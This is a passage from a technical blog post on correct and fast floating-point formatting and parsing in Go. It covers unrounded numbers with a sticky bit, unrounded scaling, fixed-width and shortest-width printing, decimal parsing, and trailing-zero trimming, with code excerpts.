bits,\nmeaningm∈[252,253).\nFor example, for numbers in[½,1), float64s usee=−53;\nfor numbers in[1,2)they usee=−52;\nand so on.[The notation[a,b)is ahalf-open interval, which includesabut notb.\nIn contrast, theclosed interval[a,b]includes bothaandb.\nWe writex∈[a,b)orx∈[a,b]to say thatxis in that interval.\nUsing this notation,m∈[252,253)means252≤m<253.]In addition to limiting the mantissa size, we must also limit the exponent,\nto keep the overall number a fixed size.\nFor float64s, assumingm∈[252,253), the exponente∈[−1074,971].A float64 consists of 1 sign bit, 11 exponent bits, and 52 mantissa bits.\nThenormal11-bit exponent encodings0x001through0x3fedenotee=−1074throughe=971.\nFor those, the mantissam∈[252,253),\nand it is encoded into only 52 bits by omitting the leading 1 bit.\nThe special exponent encoding0x3ffis used for infinity and not-a-number.\nThat leaves the encoding0x000, which is also special.\nIt denotese=−1074(like0x001does)\nbut with mantissasm∈[0,252)without an implicit leading 1.\nThesesubnormalsordenormalized numbers[8]\ncontinue the fixed-point2−1074scale down to zero,\nwhich ends up encoded (not coincidentally) as 64 zero bits.Other definitions of floating point numbers use different interpretations.\nFor example the IEEE754 standard usesm∈[1,2)withe∈[−1023,1023],\nwhile the C standard libaryfrexpfunction usesm∈[½,1)withe∈[−1022,1024].\nBoth of these choices makemitself a fixed-point number instead of an integer.\nOur integer definition lets us use integer math.\nThese interpretations are all equivalent and differ only by a constant added toe.This description of float64s applies to float32s as well, but with different constants. This table summarizes the two encodings:float32float64sign bits11encoded mantissa bits2352encoded exponent bits811exponent range form∈[1,2)[−127,127][−1023,1023]exponent range for integerm[−150,104][−1074,971]normal numbers[223,224)·2[−150,104][252,253)·2[−1074,971]subnormal numbers[0,223)·2−150[0,252)·2−1074exponent range for 64-bitm[−190,64][−1085,960]normal numbers[263,264)·2[−190,64][263,264)·2[−1085,960]subnormal numbers[0,263)·2−190[0,263)·2−1085To convert a float64 to its bits, we use Go’smath.Float64bits.// unpack64 returns m, e such that f = m * 2**e.// The caller is expected to have handled 0, NaN, and ±Inf already.// To unpack a float32 f, use unpack64(float64(f)).func unpack64(f float64) (uint64, int) {\n\tconst shift = 64 - 53\n\tconst minExp = -(1074 + shift)\n\tb := math.Float64bits(f)\n\tm := 1<<63 | (b&(1<<52-1))<<shift\n\te := int((b >> 52) & (1<<shift - 1))\n\tif e == 0 {\n\t\tm &^= 1 << 63\n\t\te = minExp\n\t\ts := 64 - bits.Len64(m)\n\t\treturn m << s, e - s\n\t}\n\treturn m, (e - 1) + minExp\n}fpfmt/fpfmt.go:23,39To convert back, we use Go’smath.Float64frombits.// pack64 takes m, e and returns f = m * 2**e.// It assumes the caller has provided a 53-bit mantissa m// and an exponent that is in range for the mantissa.func pack64(m uint64, e int) float64 {\n\tif m&(1<<52) == 0 {\n\t\treturn math.Float64frombits(m)\n\t}\n\treturn math.Float64frombits(m&^(1<<52) | uint64(1075+e)<<52)\n}fpfmt/fpfmt.go:41,49[Other presentations use “fraction” and “significand” instead of “mantissa”.\nThis post uses mantissa for consistency with my 2011 post\nand because I generally agree with Agatha Mallett’s excellent\n“In Defense of ‘Mantissa’”.]Unrounded NumbersFloating-point operations are defined as if computed exactly to infinite precision\nand then rounded to the nearest actual floating-point number,\nbreaking ties by rounding to an even mantissa.\nOf course, real implementations don’t use infinite precision;\nthey only keep enough precision to round properly.\nWe will use the same idea.\nIn our algorithms, we want the scaling operation to eventually evaluate to an integer,\nbut we want to give the caller control over the rounding step.\nSo instead of returning an integer, we will return anunrounded number,\nwhich contains all the information needed to round it in a variety of ways.The unrounded form of any real numberx, which we will write as as⟨x⟩,\nis the truncated integer part ofxfollowed by two more bits.\nThose bits indicate (1) whether the fractional part ofxwas at least ½, and (2) whether the fractional part was not exactly 0 or ½.\nIf you think ofxas a real number written in binary, the first extra bit is the bit immediately after the “binary point”—the bit that represents2−1, aka the ½ bit—and the second extra bit is the OR of all the bits after the ½ bit.This definition applies even to numbers that require an infinite binary representation.\nFor example, just as 1/3 requires an infinite decimal representation ‘0.333...’,\n1.6 requires an infinite binary representation ‘1.1001100110011...’.\nThe unrounded version⟨1.6⟩is finite: ‘1.11’.\nBut instead of reading unrounded numbers in binary,\nlet’s print⟨x⟩as‘n.hs’wherenis the integer part⟨x⟩>>2,his 0 or 5, andsis ‘+’ when the second bit is 1.\nThen⟨1.6⟩is written ‘1.5+’.⟨x⟩=⌊4x⌋|(4x≠⌊4x⌋)⟨6exactly⟩=24=‘6.0’⟨6.000001⟩=25=‘6.0+’⟨6.499999⟩=25=‘6.0+’⟨6.5exactly⟩=26=‘6.5’⟨6.500001⟩=27=‘6.5+’⟨6.999999⟩=27=‘6.5+’⟨7exactly⟩=28=‘7.0’Let’s implement unrounded numbers in Go.type unrounded uint64\n\nfunc unround(x float64) unrounded {\n\treturn unrounded(math.Floor(4*x)) | bool2[unrounded](math.Floor(4*x) != 4*x)\n}\n\nfunc (u unrounded) String() string {\n\treturn fmt.Sprintf(\"⟨%d.%d%s⟩\", u>>2, 5*((u>>1)&1), \"+\"[1-u&1:])\n}fpfmt/fpfmt.go:52,61Thebool2function converts a boolean to an integer.\n(The Go compiler will implement this using an inlined conditional move.)// bool2 converts b to an integer: 1 for true, 0 for false.func bool2[T ~int | ~uint64](b bool) T {\n\tif b {\n\t\treturn 1\n\t}\n\treturn 0\n}fpfmt/fpfmt.go:15,21We won’t use theunroundconstructor in our actual code, but it’s helpful for playing.\nFor example, we can try the examples we just saw:row(\"x\", \"raw\", \"str\")\nfor _, x := range []float64{6, 6.001, 6.499, 6.5, 6.501, 6.999, 7} {\n    u := unround(x)\n    row(x, uint64(u), u)\n}\ntable()x      raw  str\n6      24   ⟨6.0⟩\n6.001  25   ⟨6.0+⟩\n6.499  25   ⟨6.0+⟩\n6.5    26   ⟨6.5⟩\n6.501  27   ⟨6.5+⟩\n6.999  27   ⟨6.5+⟩\n7      28   ⟨7.0⟩The unrounded form⟨x⟩holds the information needed by all the usual rounding operations.\nAdding 0, 1, 2, or 3 and then dividing by four (or shifting right by two) yields: floor, round with ½ rounding down, round with ½ rounding up, and ceiling.\nIn floating-point math, we want to round with ½ rounding to even, meaning 1½ and 2½ both round to 2.\nWe can do that by adding1+odd(x),\nwhereodd(x)is 0 or 1 according to whetherxis odd.\nThat’s just the low bit ofx:odd(x)=(x&1)=(⟨x⟩>>2)&1.Putting that all together:⌊⟨x⟩⌋=(⟨x⟩+0)>>2(floor)[⟨x⟩]−=(⟨x⟩+1)>>2(round,halfdown)[⟨x⟩]even=(⟨x⟩+1+odd(x))>>2(round,halftoeven)=(⟨x⟩+1+((⟨x⟩>>2)&1))>>2[⟨x⟩]+=(⟨x⟩+2)>>2(round,halfup)⌈⟨x⟩⌉=(⟨x⟩+3)>>2(ceiling)In Go:func (u unrounded) floor() uint64         { return uint64((u + 0) >> 2) }\nfunc (u unrounded) roundHalfDown() uint64 { return uint64((u + 1) >> 2) }\nfunc (u unrounded) round() uint64         { return uint64((u + 1 + (u>>2)&1) >> 2) }\nfunc (u unrounded) roundHalfUp() uint64   { return uint64((u + 2) >> 2) }\nfunc (u unrounded) ceil() uint64          { return uint64((u + 3) >> 2) }fpfmt/fpfmt.go:62,66row(\"x\", \"floor\", \"round½↓\", \"round\", \"round½↑\", \"ceil\")\nfor _, x := range []float64{6, 6.25, 6.5, 6.75, 7, 7.5, 8.5} {\n    u := unround(x)\n    row(u, u.floor(), u.roundHalfDown(), u.round(), u.roundHalfUp(), u.ceil())\n}\ntable()x       floor  round½↓  round  round½↑  ceil\n⟨6.0⟩   6      6        6      6        6\n⟨6.0+⟩  6      6        6      6        7\n⟨6.5⟩   6      6        6      7        7\n⟨6.5+⟩  6      7        7      7        7\n⟨7.0⟩   7      7        7      7        7\n⟨7.5⟩   7      7        8      8        8\n⟨8.5⟩   8      8        8      9        9Dividing unrounded numbers preserves correct rounding as long as the second extra bit\nis maintained correctly: once it is set to 1, it has to stay a 1 in all future results.\nThis gives the second extra bit its shorter name: thesticky bit.To divide an unrounded number, we do a normal divide but force the sticky bit to 1\nwhen there is a remainder.\nRight shift does the same.⟨x/n⟩=(⟨x⟩/n)|(⟨x⟩modn≠0)|(⟨x⟩&1)⟨x>>n⟩=(⟨x⟩>>n)|(⟨x⟩mod2n≠0)|(⟨x⟩&1)For example, if we rounded 15.4 to an integer 15 and then divided it by 6,\nwe’d get 2.5, which rounds down to 2,\nbut the more precise answer would be 15.4/6 = 2.57, which rounds up to 3.\nAn unrounded division handles this correctly:⟨15.4⟩=61‘15.0+’“alittlemorethan15”⟨15.4/6⟩=11‘2.5+’“alittlemorethan2½”[⟨15.4/6⟩]=3Let’s implement division and right shift in Go:func (u unrounded) div(d uint64) unrounded {\n\tx := uint64(u)\n\treturn unrounded(x/d) | u&1 | bool2[unrounded](x%d != 0)\n}\n\nfunc (u unrounded) rsh(s int) unrounded {\n\treturn u>>s | u&1 | bool2[unrounded](u&((1<<s)-1) != 0)\n}fpfmt/fpfmt.go:69,76u := unround(15.1).div(6)\nfmt.Println(u, u.round())⟨2.5+⟩ 3Finally, we are going to need to be able to nudge an unrounded number\nup or down before computing a ceiling or floor,\nas if we added or subtracting a tiny amount.\nLet’s add that:func (u unrounded) nudge(δ int) unrounded { return u + unrounded(δ) }fpfmt/fpfmt.go:67row(\"x\", \"nudge(-1).floor\", \"floor\", \"ceil\", \"nudge(+1).ceil\")\nfor _, x := range []float64{15, 15.1, 15.9, 16} {\n    u := unround(x)\n    row(u, u.nudge(-1).floor(), u.floor(), u.ceil(), u.nudge(+1).ceil())\n}x        nudge(-1).floor  floor  ceil  nudge(+1).ceil\n⟨15.0⟩   14               15     15    16\n⟨15.0+⟩  15               15     16    16\n⟨15.5+⟩  15               15     16    16\n⟨16.0⟩   15               16     16    17Floating-point hardware maintains three extra bits to round\nall arithmetic operations correctly.\nFor just division and right shift, we can get by with only two bits.Unrounded ScalingThe fundamental insight of this post is that all\nfloating-point conversions can be written correctly\nand simply usingunrounded scaling,\nwhich multiplies a numberxby a power of two and a power of ten\nand returns the unrounded product.uscale(x,e,p)=⟨x·2e·10p⟩.Whenpis negative, the value10pcannot be stored exactly in any finite binary floating-point number,\nso any implementation of uscale must be careful.In Go, we can implement uscale using big integers and an unrounded division:func uscale(x uint64, e, p int) unrounded {\n    num :=   mul(big(4), big(x), pow(2, max(0, p)),  pow(10, max(0, e)))\n    denom := mul(                pow(2, max(0, -p)), pow(10, max(0, -e)))\n    div, mod := divmod(num, denom)\n    return unrounded(div.uint64() | bool2[uint64](!mod.isZero()))\n}Themaxexpressions choose between multiplying2eintonumwhene>0or multiplying2−eintodenomwhene<0,\nand similarly for10p.\nThedivmodimplements the floor, andmod.isZeroreports\nwhether the floor was exact.This implementation of uscale is correct but inefficient.\nIn our usage,eandpwill mostly cancel out,\ntypically with opposite signs,\nand the inputxand resultuscale(x,e,p),\nwill always fit in 64 bits.\nThat limited input domain and range makes it possible\nto implement a very fast, completely accurate uscale,\nand we’ll see that implementation later.Our actual implementation will be split into two functions,\nto allow sharing some computations derived frompande.\nInstead ofuscale(x, e, p), the fast Go version will be called asuscale(x, prescale(e, p, log2Pow10(p))).\nAlso, callers are responsible for passing in anxleft-shifted to have its\nhigh bit set.\nTheunpackfunction we looked at already arranged that for its result,\nbut otherwise callers need to do something like:shift = 64 - bits.Len64(x)\n... uscale(x<<shift, prescale(e-shift, p, log2Pow10(p))) ...Conceptually, uscale maps numbers on one fixed-point scale to numbers on another,\nincluding converting between binary and decimal scales.\nFor example, consider the scales2−13and10−4:Givenxfrom the2−13side,uscale(x,−13,4)maps to the equivalent\npoint on the10−4side;\nand givenxfrom the10−4,uscale(x,13,−4)maps to the equivalent\npoint on the2−13side.\nBefore we look at the fast implementation ofuscale,\nlet’s look at how it simplifies all the floating-point printing\nand parsing algorithms.Fixed-Width PrintingOur first application of uscale is fixed-width printing.\nGivenf=m·2e, we want to compute its\napproximate equivalentd·10de, wheredhas exactlyndigits.\nIt only takes 17 digits to uniquely identify any float64,\nso we’re willing to limitn≤18,\nwhich will ensuredfits in a uint64.\nThe strategy is to multiplyfby10pfor somepand then round it to an integerd.\nThen the result isd·10−p.Then-digit requirement meansd=m·2e·10p∈[10n−1,10n).\nFrom this we can derivep:m·2e·10p∈[10n−1,10n)m·2e·10p∈10n−1·[1,10)[factoringrange](log10m·2e)+p∈n−1+[0,1)[takinglog]p∈n−1−(log10m·2e)+[0,1)[isolatingp]p∈n−1−((log10m·2e)−[0,1))[regrouping]p=n−1−⌊log10m·2e⌋[pisaninteger]p=n−1−⌊(log102)·(e+log2m)⌋[changinglogbase]It is okay forpto be too big—we will get an extra digit that we can divide away—so\nwe can approximatelog2masbits(m)−1, wherebits(m)is the bit length ofm.\nThat gives usp=n−1−⌊(log102)·(e+bits(m)−1)⌋.\nWith this derivation ofp, uscale does the rest of the work.The floor expression is a simple linear function and can be computed\nexactly for our inputs using fixed-point arithmetic:// log10Pow2(x) returns ⌊log₁₀ 2**x⌋ = ⌊x * log₁₀ 2⌋.func log10Pow2(x int) int {// log₁₀ 2 ≈ 0.30102999566 ≈ 78913 / 2^18return (x * 78913) >> 18\n}fpfmt/fpfmt.go:78,82Thelog2Pow10function, which we mentioned above and need to\nuse when callingprescale, is similar:// log2Pow10(x) returns ⌊log₂ 10**x⌋ = ⌊x * log₂ 10⌋.func log2Pow10(x int) int {// log₂ 10 ≈ 3.32192809489 ≈ 108853 / 2^15return (x * 108853) >> 15\n}fpfmt/fpfmt.go:84,88Now we can put everything together:// FixedWidth returns the n-digit decimal form of f as d * 10**p.// n can be at most 18.func FixedWidth(f float64, n int) (d uint64, p int) {\n\tif n > 18 {\n\t\tpanic(\"too many digits\")\n\t}\n\tm, e := unpack64(f)\n\tp = n - 1 - log10Pow2(e+63)\n\tu := uscale(m, prescale(e, p, log2Pow10(p)))\n\td = u.round()\n\tif d >= uint64pow10[n] {\n\t\td, p = u.div(10).round(), p-1\n\t}\n\treturn d, -p\n}fpfmt/fpfmt.go:96,110That’s the entire conversion!The code splitsfintom,e;\ncomputespas just described;\nand then usesuscaleandroundto computed=f·10p.\nIf the result has an extra digit,\neither because our approximate log madeptoo big,\nor because of rollover during rounding,\nwe divide the unrounded form by 10, round again, and updatep.\nWhen we approximatedlog2mby counting bits,\nwe used the exact log of the greatest power of two less than or equal tom,\nso the computeddmust be less than twice the intended limit10n,\nmeaning the leading digit (if there are too many digits) must be 1.\nAnd rollover only happens for ‘999...’,\nso it is not possible to have both an extra digit and rollover.As an example conversion,\nconsider a float64 approximation ofπ(0x1921fb54442d18·2−51) to 15 decimal digits.\nWe havee=−51,n=15, andbits(m)=53,\nsop=n−1−⌊(log102)·(e+bits(m)−1)⌋=14.The2−51and10−14scales align like this:Thenuscale(0x1921fb54442d18,−51,14)returns the unrounded number ‘314159265358979.0+’,\nwhich rounds to 314159265358979.\nOur answer is then314159265358979·10−14.Parsing DecimalsUnrounded scaling also lets us parse decimal representations of floating-point numbers efficiently.\nLet’s assume we’ve taken care of parsing a string like ‘1.23e45’\nand now have an integer and exponent liked=123,p=45−2=43.\nTo convertd·10pto a float64,\nwe can choose an appropriateeso thatd·2e·10p∈[252,253)and then return[uscale(d,e,p)]·2−e.The derivation ofeis similar to the derivation ofpfor printing:d·2e·10p∈[252,253)d·2e·10p∈252·[1,2)[factoringrange](log2d·10p)+e∈52+[0,1)[takinglog]e∈52−(log2d·10p)+[0,1)[isolatinge]e∈52−((log2d·10p)−[0,1))[regrouping]e=52−⌊log2d·10p⌋[pisaninteger]e=52−⌊(log2d)+(log210)·p⌋[changinglogbase]Once again, it is okay to overestimatee, so we can approximatelog2d=bits(d)−1, yieldinge=53−bits(d)−⌊(log210)·p⌋.\nIfeis very large,−ewill be very small,\nmeaning we will be creating a subnormal,\nso we need to round to a smaller number of bits.\nTo handle this, we capeat 1074,\nwhich caps−eat−1074.\nAs before, due to the approximation oflog2d, the scaled result is at most twice as large as our target,\nmeaning it might have one extra bit to shift away.// Parse rounds d * 10**p to the nearest float64 f.// d can have at most 19 digits.func Parse(d uint64, p int) float64 {\n\tif d > 1e19 {\n\t\tpanic(\"too many digits\")\n\t}\n\tb := bits.Len64(d)\n\te := min(1074, 53-b-log2Pow10(p))\n\tu := uscale(d<<(64-b), prescale(e-(64-b), p, log2Pow10(p)))\n\tm := u.round()\n\tif m >= 1<<53 {\n\t\tm, e = u.rsh(1).round(), e-1\n\t}\n\treturn pack64(m, -e)\n}fpfmt/unopt/fpfmt.go:111,125FixedWidthandParsedemonstrate\nexactly how similar printing and parsing really are.\nIn printing, we are givenm,eand\nfindp; thenuscale(m,e,p)converts binary to decimal.\nIn parsing, we are givend,pand finde;\nthenuscale(d,e,p)converts decimal to binary.We can make parsing a little faster with a few hand optimizations.\nThis optimized version introduceslpto avoid callinglog2Pow10twice,\nand it implements the extra digit handling in branch-free code.// Parse rounds d * 10**p to the nearest float64 f.// d can have at most 19 digits.func Parse(d uint64, p int) float64 {\n\tif d > 1e19 {\n\t\tpanic(\"too many digits\")\n\t}\n\tb := bits.Len64(d)\n\tlp := log2Pow10(p)\n\te := min(1074, 53-b-lp)\n\tu := uscale(d<<(64-b), prescale(e-(64-b), p, lp))// This block is branch-free code for://\tif u.round() >= 1<<53 {//\t\tu = u.rsh(1)//\t\te = e - 1//\t}s := bool2[int](u >= unmin(1<<53))\n\tu = (u >> s) | u&1\n\te = e - s\n\n\treturn pack64(u.round(), -e)\n}// unmin returns the minimum unrounded that rounds to x.func unmin(x uint64) unrounded {\n\treturn unrounded(x<<2 - 2)\n}fpfmt/fpfmt.go:112,138Now we are ready for our next challenge: shortest-width printing.Shortest-Width PrintingShortest-width printing means to prepare a decimal representation\nthat a floating-point parser would convert back to the exact samefloat64,\nusing as few digits as possible.\nWhen there are multiple possible shortest decimal outputs,\nwe insist on the one that is nearest the original input,\nnamely the correctly-rounded one.\nIn general, 17 digits are always enough to uniquely identify afloat64,\nbut sometimes fewer can be used, even down to a single digit in numbers like 1, 2e10, and 3e−42.An obvious approach would be to useFixedPrintfor increasing values ofn,\nstopping whenParse(FixedPrint(f, n)) == f.\nOr maybe we should derive an equation fornand then useFixedPrint(f, n)directly.\nSurprisingly, neither approach works:Short(f)is not necessarilyFixedPrint(f, n)for somen.\nThe simplest demonstration of this isf=289=618970019642690137449562112=0x10000000000000·237,\nwhich looks like this:Becausefis a power of two, the floating-point exponent\nchanges atf,\nas does the spacing between floating-point numbers.\nThe next smallest value is0x1ffffffffffff·2−38,\nmarked on the diagram as0xffffffffffff½·2−37.\nThe dotted lines mark the halfway points betweenfand its nearest floating point neighbors.\nThe accurate decimal answers are those at or between the dotted lines,\nall of which convert back tof.The correct rounding offto 16 digits ends in …901: the next digit infis 3,\nso we should round down.\nHowever, because of the spacing change aroundf,\nthat correct decimal rounding does not convert back tof.\nAFixedPrintloop would choose a 17-digit form instead.\nBut there is an accurate 16-digit form, namely …902.\nThat decimal is closer tofthan it is to any other float64,\nmaking it an accurated.\nAnd since the closer 16-digit value …901 is not an accurated,Shortshould use …902 instead.Assuming as usual thatf=m·2e,\nlet’s definefootprint(f)to be the distance between the midpoints fromfto its\nfloating-point neighbors.\nNormally those neighbors are2ein either direction—the midpoints are(m±½)·2e—sofootprint(f)=2e.\nAt a power of two with an exponent change,\nthe lower midpoint is instead(m−¼)·2e,\nsofootprint(f)=¾·2e.\nThe rounding paradox can only happen for powers of two\nwith this kind of skewed footprint.All that is to say we cannot useFixedWidthwith “the rightn”.\nBut we can use scale directly with “the rightp.”\nSpecifically, we can compute the midpoints betweenfand its floating-point neighbors\nand scale them to obtain the\nminimum and maximum valid choices ford.\nThen we can make the best choice:If one of the validdends in 0, use it after removing trailing zeros.(Choosing the rightpwill allow at most ten consecutive integers,\nso at most will one end in 0.)If there is only one validd, use it.Otherwise there are at least two validd, at least one on each side off;\nuse the correctly rounded one.Here is an example of the first case: one of the validdends in zero.We already saw an example of the second case: only one validd.\nFor numbers with symmetric footprints, that will be the\ncorrectly roundedd.\nAs we saw for numbers with skewed footprints,\nthat may not be the correctly roundedd,\nbut it is still the correct answer.Finally, here is an example of the third case: multiple validd,\nbut none that end in zero.\nNow we should use the correctly rounded one.This sounds great, but how do we determine the rightp?\nWe wantfootprint(f)to allow at least one decimal integer,\nbut at most ten, meaning1≤footprint(f)<10.\nLuckily, we can hit that target exactly.For a symmetric footprint:footprint(f)·10p∈[1,10)2e·10p∈[1,10)[definitionoffootprint(f)]10p∈(1/2e)·[1,10)[isolatingp]p∈−(log102)·e+[0,1)[takinglog]p∈−((log102)·e−[0,1))[regrouping]p=−⌊(log102)·e⌋[pisaninteger]For a skewed footprint:footprint(f)·10p∈[1,10)¾·2e·10p∈[1,10)[definitionoffootprint(f)]10p∈(1/(¾·2e))·[1,10)[isolatingp]p∈−(log10¾+(log102)·e)+[0,1)[takinglog]p∈−(log10¾+(log102)·e−[0,1))[regrouping]p=−⌊log10¾+(log102)·e⌋[pisaninteger]For the symmetric footprint, we can uselog10Pow2,\nbut for the skewed footprint, we need a new approximation:// skewed computes the skewed footprint of m * 2**e,// which is ⌊log₁₀ 3/4 * 2**e⌋ = ⌊e*(log₁₀ 2)-(log₁₀ 4/3)⌋.func skewed(e int) int {\n\treturn (e*631305 - 261663) >> 21\n}fpfmt/fpfmt.go:234,238We should worry about a footprint with decimal width exactly 1,\nsince iffhad an odd mantissa,\nthe midpoints would be excluded.\nIn that case, if the decimals were the exact midpoints,\nthere would be no decimal between them,\nmaking the conversion invalid.\nBut it turns out we should not worry too much.\nFor a skewed footprint,¾·2e·10pcan never be exactly 1,\nbecause nothing can divide away the 3.\nFor a symmetric footprint,2e·10p=1can only happen fore=p=0,\nbut then scaling is a no-op,\nso that the decimal integers are exactly the binary integers.\nThe non-integer midpoints map to non-integer decimals.When we compute the decimal equivalents of the midpoints,\nwe will use ceiling and floor instead of rounding them,\nto make sure the integer results are valid decimal answers.\nIf the mantissamis odd, we will nudge the unrounded forms\ninward slightly before taking the ceiling or floor,\nsince rounding will be away fromm.The Go code is:// Short computes the shortest formatting of f,// using as few digits as possible that will still round trip// back to the original float64.func Short(f float64) (d uint64, p int) {\n\tconst minExp = -1085\n\n\tm, e := unpack64(f)\n\n\tvar min uint64\n\tz := 11// extra zero bits at bottom of m; 11 for 53-bit mif m == 1<<63 && e > minExp {\n\t\tp = -skewed(e + z)\n\t\tmin = m - 1<<(z-2)// min = m - 1/4 * 2**(e+z)} else {\n\t\tif e < minExp {\n\t\t\tz = 11 + (minExp - e)\n\t\t}\n\t\tp = -log10Pow2(e + z)\n\t\tmin = m - 1<<(z-1)// min = m - 1/2 * 2**(e+z)}\n\tmax := m + 1<<(z-1)// max = m + 1/2 * 2**(e+z)odd := int(m>>z) & 1\n\n\tpre := prescale(e, p, log2Pow10(p))\n\tdmin := uscale(min, pre).nudge(+odd).ceil()\n\tdmax := uscale(max, pre).nudge(-odd).floor()\n\n\tif d = dmax / 10; d*10 >= dmin {\n\t\treturn trimZeros(d, -(p - 1))\n\t}\n\tif d = dmin; d < dmax {\n\t\td = uscale(m, pre).round()\n\t}\n\treturn d, -p\n}fpfmt/fpfmt.go:198,232Notice that this algorithm requires either two or three calls touscale.\nWhen the number being printed has only one valid representation\nof the shortest length, we avoid the third call touscale.\nAlso notice that theprescaleresult is shared by all three calls.Whenm=263,min<263,\nmeaning it won’t be left shifted as far as possible\nduring the call touscale.\nAlthough we could detect this case and calluscalewith2·minande−1,\nusingminunmodified is fine:\nit is still shifted enough that the bitsuscaleneeds to return will stay in the high 64 bits of the 192-bit product,\nand using the sameelets us use the sameprescalework for all three calls.Trimming ZerosThetrimZerosfunction used inShortremoves any trailing zeros from its argument,\nupdating the decimal power. An unoptimized version is:// trimZeros removes trailing zeros from x * 10**p.// If x ends in k zeros, trimZeros returns x/10**k, p+k.// It assumes that x ends in at most 16 zeros.func trimZeros(x uint64, p int) (uint64, int) {\n\tif x%10 != 0 {\n\t\treturn x, p\n\t}\n\tx /= 10\n\tp += 1\n\n\tif x%100000000 == 0 {\n\t\tx /= 100000000\n\t\tp += 8\n\t}\n\tif x%10000 == 0 {\n\t\tx /= 10000\n\t\tp += 4\n\t}\n\tif x%100 == 0 {\n\t\tx /= 100\n\t\tp += 2\n\t}\n\tif x%10 == 0 {\n\t\tx /= 10\n\t\tp += 1\n\t}\n\treturn x, p\n}fpfmt/unopt/fpfmt.go:227,254The initial removal of a single zero gives an early return for\nthe common case of having no zeros.\nOtherwise, the code makes four additional checks that\ncollectively remove up to 16 more zeros.\nFor outputs with many zeros, these four checks run faster\nthan a loop removing one zero at a time.When compiling this code,\nthe Go compiler reduces the remainder checks to multiplications\nusing the following well-known optimization.\nAn exactuint64divisionx/cwherexmodc=0can be implemented byx·mwheremis theuint64multiplicative inverse ofc, meaningm·cmod264=1:\nSincecis also the multiplicative inverse ofm,x·mis\nlossless—all the exact multiples ofcmap to all of[0,(264−1)/c]—so\nthe non-multiples are forced to map to larger values.\nThis observation gives a quick test for whetherxis an exact multiple ofc:\ncheck whetherx·m≤(264−1)/c.Only oddchave multiplicative inverses modulo powers of two,\nso even divisors require more work.\nTo compute an exact divisionx/(c<<s),\nwe can use(x/c)>>sinstead.\nTo check for remainder, we need to check that those lowsbits are all zero before we shift them away.\nWe can merge that check with the range check by rotating those bits\ninto the high part instead of discarding them:\ncheck whetherx·m↻>s≤(264−1)/c,\nwhere↻>is right rotate.The Go compiler does this transformation automatically\nfor theifconditions intrimZeros,\nbut inside theifbodies, it does not reuse the\nexact quotient it just computed.\nI considered changing the compiler to recognize that pattern,\nbut instead I wrote out the remainder check by hand\nin the optimized version, allowing me to reuse the computed exact quotients:// trimZeros removes trailing zeros from x * 10**p.// If x ends in k zeros, trimZeros returns x/10**k, p+k.// It assumes that x ends in at most 16 zeros.func trimZeros(x uint64, p int) (uint64, int) {\n\tconst (\n\t\tmaxUint64 = ^uint64(0)\n\t\tinv5p8    = 0xc767074b22e90e21// inverse of 5**8inv5p4    = 0xd288ce703afb7e91// inverse of 5**4inv5p2    = 0x8f5c28f5c28f5c29// inverse of 5**2inv5      = 0xcccccccccccccccd// inverse of 5)// Cut 1 zero, or else return.if d := bits.RotateLeft64(x*inv5, -1); d <= maxUint64/10 {\n\t\tx = d\n\t\tp += 1\n\t} else {\n\t\treturn x, p\n\t}// Cut 8 zeros, then 4, then 2, then 1.if d := bits.RotateLeft64(x*inv5p8, -8); d <= maxUint64/100000000 {\n\t\tx = d\n\t\tp += 8\n\t}\n\tif d := bits.RotateLeft64(x*inv5p4, -4); d <= maxUint64/10000 {\n\t\tx = d\n\t\tp += 4\n\t}\n\tif d := bits.RotateLeft64(x*inv5p2, -2); d <= maxUint64/100 {\n\t\tx = d\n\t\tp += 2\n\t}\n\tif d := bits.RotateLeft64(x*inv5, -1); d <= maxUint64/10 {\n\t\tx = d\n\t\tp += 1\n\t}\n\treturn x, p\n}fpfmt/fpfmt.go:240,278This approach to trimming zeros is from Dragonbox.\nFor more about the general optimization,\nsee Warren’sHacker’s Delight[34],\nsections 10-16 and 10-17.Fast, Accurate ScalingThe conversion algorithms we examined are nice and simple.\nFor them to be fast,uscaleneeds to be fast while remaining correct.\nAlthough multiplication by2ecan be implemented by shifts,uscalecannot actually compute or multiply by10p—that would take too long whenpis a large positive or negative number.\nInstead, we can approximate10pas a floating-point numberpm·2pewith a 128-bit mantissa,\nlooked up in a table indexed byp.\nSpecifically, we will usepe=⌊log210p⌋−127andpm=⌈10p/2pe⌉,\nensuring thatpm∈[2127,2128).\nWe will write a separate program to generate this table.\nIt emits Go code definingpow10Min,pow10Max, andpow10Tab:pow10Tab[0]holds the entry forp=pow10Min.\nTo figure out how big the table needs to be,\nwe can analyze the three functions we just wrote.FixedWidthconverts floating-point to decimal.\nIt needs to calluscalewith a 53-bitx,e∈[−1137,960], andp∈[−307,341].Shortalso converts floating-point to decimal.\nIt needs to calluscalewith a 55-bitx,e∈[−1137,960], andp∈[−292,324].Parseconverts decimal to floating-point.\nIt needs to calluscalewith a 64-bitxandp∈[−343,289].\n(Outside that range ofp,Parsecan return 0 or infinity.)So the table needs to provide answers forp∈[−343,341].If10p≈pm·2pe, thenx·2e·10p≈x·pm·2e+pe.\nIn all of our algorithms, the result ofuscalewas always small—at most 64 bits.\nSincepmis 128 bits andx·pmis even bigger,e+pemust be negative,\nso this computation is(x*pm) >> -(e+pe).\nBecause of the ceiling,pmmay be too large by an errorε0<1,\nsox·pmmay be too large by an errorε1=x·ε0<x.\nTo round exactly, we care whether any of the shifted bits is 1,\nbutε1may change the lowbits(x)bits,\nso we can’t trust them.\nInstead, we will throw them away.\nand use only the upper bits to compute our unrounded number.\nThat is the entire idea!Now let’s look at the implementation.\nTheprescalefunction returns ascalerwithpmand a shift counts:// A scaler holds derived scaling constants for a given e, p pair.type scaler struct {\n\tpm pmHiLo\n\ts  int\n}// A pmHiLo represents hi<<64 + lo.type pmHiLo struct {\n\thi uint64\n\tlo uint64\n}fpfmt/unopt/fpfmt.go:256,266We want the shift count to reserve two extra bits for the unrounded\nrepresentation and to apply to the top 64-bit word of the 192-bit product,\nwhich gives this formula:s=−(e+pe)−2−(192−64)=−(e+⌊log210p⌋−127)−2−128=−(e+⌊log210p⌋+3)That translates directly to Go:// prescale returns the scaling constants for e, p.// lp must be log2Pow10(p).func prescale(e, p, lp int) scaler {\n\treturn scaler{pm: pow10Tab[p-pow10Min], s: -(e + lp + 3)}\n}fpfmt/fpfmt.go:292,296Inuscale, since the caller left-justifiedxto 64 bits,\ndiscarding the lowbits(x)bits means discarding the\nlowest 64 bits of the product, which we skip computing entirely.\nThen we use the middle 64-bit word and the lowsbits\nof the upper word to set the sticky bit in the result.// uscale returns unround(x * 2**e * 10**p).// The caller should pass c = prescale(e, 